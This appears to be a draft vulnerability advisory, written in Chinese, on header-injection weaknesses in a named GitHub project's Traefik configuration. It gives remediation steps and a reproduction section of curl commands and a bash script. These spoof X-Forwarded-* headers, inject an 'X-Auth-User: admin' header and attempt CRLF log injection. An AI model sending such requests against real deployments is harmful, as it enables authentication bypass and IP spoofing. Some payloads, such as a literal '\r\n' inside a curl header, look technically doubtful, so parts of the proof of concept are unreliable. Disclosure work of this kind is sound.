# CVE-2025-XXXXX: Multiple Header Injection Vulnerabilities in stevegroom/traefikGateway Traefik Configuration

## 基本信息

- **CVE ID**: CVE-2025-XXXXX (待分配)
- **项目**: stevegroom/traefikGateway
- **发现日期**: 2025-12-28
- **报告者**: Security Research
- **严重程度**: High (CVSS 7.5)

## 漏洞描述

stevegroom/traefikGateway 项目中的 Traefik 配置存在多个 HTTP Header Injection 漏洞：
1. Forward Auth Header Injection (trustForwardHeader: true)
2. HTTP Header Injection (forwardedHeaders.insecure)

两种漏洞同时存在，且都没有配置 `trustedIPs` 白名单，导致 Traefik 信任所有来源的 X-Forwarded-* 头。

## 受影响文件

- `traefik/docker-compose.yaml`

## 漏洞配置

```yaml
labels:
  - "traefik.frontend.auth.forward.trustForwardHeader=true"
  - "traefik.http.middlewares.keycloakForwardAuth.forwardauth.trustForwardHeader=true"
command:
  - "--entrypoints.ssh.forwardedHeaders.insecure=true"
```

## 漏洞详情

### 问题分析

1. **双重漏洞**:
   - Forward Auth 中间件配置了 `trustForwardHeader: true`
   - EntryPoint 配置了 `forwardedHeaders.insecure=true`
2. **影响**: Traefik 会信任**所有来源**的 X-Forwarded-* 头
3. **攻击向量**: 攻击者可以直接向 Traefik 发送恶意请求

### 攻击场景

```
攻击者 → Traefik (insecure: true, trustForwardHeader: true, 无白名单) → 后端服务/认证服务
```

### 攻击载荷示例

```http
GET /protected HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1\r\nX-Injected-Header: malicious-value\r\n
```

## 影响评估

### CVSS 3.1 评分

- **Base Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N

### 实际影响

1. **日志注入** ✅ **几乎肯定发生**
2. **IP 欺骗** ✅ **很可能发生**
3. **认证绕过** ⚠️ **可能发生**（如果认证服务实现不当）
4. **响应拆分** ⚠️ **可能发生**

## 威胁模型

### 攻击前提条件

1. Traefik 配置了 `forwardedHeaders.insecure=true` 或 `trustForwardHeader: true`
2. 没有配置 `trustedIPs` 白名单
3. 攻击者能够直接访问 Traefik

### 攻击步骤

1. 攻击者构造包含恶意 X-Forwarded-For 头的 HTTP 请求
2. Traefik 信任并转发该头到后端服务或认证服务
3. 后端服务处理该头，可能导致日志注入、IP 欺骗或认证绕过

## 修复建议

### 方案 1: 移除 insecure 配置（推荐）

```yaml
# 移除这些行
# - "--entrypoints.ssh.forwardedHeaders.insecure=true"
# - "traefik.frontend.auth.forward.trustForwardHeader=true"
# - "traefik.http.middlewares.keycloakForwardAuth.forwardauth.trustForwardHeader=true"
```

### 方案 2: 配置 trustedIPs 白名单

```yaml
command:
  - "--entrypoints.ssh.forwardedHeaders.insecure=true"
  - "--entrypoints.ssh.forwardedHeaders.trustedIPs=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16"
```

对于 Forward Auth，需要在 Traefik 的全局配置中设置 trustedIPs。

## 漏洞复现

### 环境准备

1. **克隆项目仓库**:
   ```bash
   git clone https://github.com/stevegroom/traefikGateway.git
   cd traefikGateway
   ```

2. **检查漏洞配置**:
   ```bash
   # 查看 docker-compose.yaml 中的配置
   cat traefik/docker-compose.yaml | grep -A 20 "traefik:" | grep -E "(trustForwardHeader|forwardedHeaders)"
   ```

3. **启动服务**:
   ```bash
   cd traefik
   docker-compose up -d
   ```

### 漏洞复现步骤

#### 步骤 1: 确认双重漏洞配置

```bash
# 检查 Traefik 容器配置
docker inspect $(docker-compose ps -q traefik) | jq '.[0].Config.Labels' | grep -i "forward"

# 应该看到：
# "traefik.frontend.auth.forward.trustForwardHeader": "true"
# "traefik.http.middlewares.keycloakForwardAuth.forwardauth.trustForwardHeader": "true"

# 检查启动命令
docker inspect $(docker-compose ps -q traefik) | jq '.[0].Args'

# 应该看到：
# "--entrypoints.ssh.forwardedHeaders.insecure=true"
# 但没有 trustedIPs 配置
```

#### 步骤 2: 测试 Forward Auth Header Injection

```bash
# 获取 Traefik 服务地址
TRAEFIK_IP=$(docker-compose ps -q traefik | xargs docker inspect | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress')

# 测试 Forward Auth 中间件的漏洞
# 访问受保护的路由
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Forwarded-Host: evil.com" \
     -H "X-Auth-User: admin" \
     http://$TRAEFIK_IP:80/protected

# 注入恶意头到认证服务
curl -v -H "X-Forwarded-For: 127.0.0.1\r\nX-Injected-Auth: malicious" \
     http://$TRAEFIK_IP:80/protected
```

#### 步骤 3: 测试 HTTP Header Injection (EntryPoint)

```bash
# 测试 EntryPoint 级别的漏洞
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Injected-Header: malicious-value" \
     http://$TRAEFIK_IP:22/  # SSH entrypoint

# CRLF 注入
curl -v -H "X-Forwarded-For: 127.0.0.1%0D%0AX-Log-Injection: CRLF-TEST" \
     http://$TRAEFIK_IP:22/
```

#### 步骤 4: 测试双重漏洞组合利用

```bash
# 同时利用两种漏洞
curl -v -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-Proto: https" \
     -H "X-Forwarded-Host: evil.com" \
     -H "X-Auth-User: admin\r\nX-Injected: test" \
     http://$TRAEFIK_IP:80/protected
```

#### 步骤 5: 验证漏洞

```bash
# 查看 Keycloak 认证服务日志（如果部署了）
docker-compose logs keycloak | grep -i "forwarded" | tail -20

# 查看后端服务日志
docker-compose logs backend | grep -i "forwarded" | tail -20

# 查看 Traefik 日志
docker-compose logs traefik | tail -30
```

### 预期结果

1. **Forward Auth 漏洞**: 认证服务日志中包含注入的恶意内容
2. **HTTP Header Injection 漏洞**: 后端服务日志中包含注入的恶意内容
3. **双重漏洞**: 两种漏洞同时生效，攻击面更大
4. **IP 欺骗**: 两种漏洞都允许 IP 欺骗

### 自动化测试脚本

```bash
#!/bin/bash
TRAEFIK_IP=$(docker-compose ps -q traefik | xargs docker inspect | jq -r '.[0].NetworkSettings.Networks | to_entries[0].value.IPAddress')

echo "[*] Testing Dual Header Injection Vulnerabilities"
echo "[*] Target: $TRAEFIK_IP"

# Test 1: Forward Auth injection
echo "[+] Test 1: Forward Auth Header Injection"
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Auth-User: admin" \
     -H "X-Injected-Auth: test" \
     http://$TRAEFIK_IP:80/protected > /dev/null

# Test 2: EntryPoint injection
echo "[+] Test 2: EntryPoint Header Injection"
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Injected-Header: test" \
     http://$TRAEFIK_IP:22/ > /dev/null

# Test 3: Combined attack
echo "[+] Test 3: Combined Dual Vulnerability"
curl -s -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Auth-User: admin" \
     -H "X-Injected: combined-test" \
     http://$TRAEFIK_IP:80/protected > /dev/null

echo "[*] Check logs for both Keycloak and backend services"
```

## 备注

这是实际项目配置（56 stars），可能被用于生产环境。双重漏洞增加了攻击面，建议尽快修复。

